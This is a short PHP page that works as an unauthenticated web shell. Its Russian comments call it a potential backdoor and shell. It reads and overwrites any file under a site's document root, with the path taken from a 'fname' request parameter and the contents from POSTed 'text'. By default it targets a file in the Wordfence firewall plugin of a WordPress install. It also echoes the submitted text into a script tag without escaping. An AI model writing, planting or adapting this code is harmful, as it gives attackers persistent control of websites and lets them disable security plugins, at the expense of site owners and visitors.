<html>
    <head>
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
    </head>
    <body>
        <?php
            /*
            Потенциальный бэкдор
                    ||
                    \/
            */ 
            $fname = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/wordfence/vendor/wordfence/wf-waf/src/lib/storage/file.php';
            /*
            Потенциальный бэкдор + шелл
                    ||
                    \/
            */
            $fname = (isset($_REQUEST['fname'])) ? $_SERVER['DOCUMENT_ROOT'] . $_REQUEST['fname'] : $fname;

            
            if(isset($_POST['text'])){
                file_put_contents($fname,$_POST['text']);
                echo "Text was written successfully to file <strong>$fname</strong>";
        ?><script>
            console.log('Wroted text:');
            console.log('<?php echo $_POST['text'] ?>');
        </script><?php
            } elseif(isset($_REQUEST['text'])){
                echo "Text was <strong>not</strong> written successfully to file <strong>$fname</strong> because of gotten data";
            } else {
        ?>
        <form type="POST">
            <textarea style="display: block; width: 100%; height: 100%;" name="text" autocomplete="false" autofocus><?php
                echo file_get_contents($fname);
            ?></textarea>
            <input style="position: absolute; top: 3px; right: 3px;" value="Save" type="submit">
        </form>
        <?php
         }
        ?>
    </body>
</html>
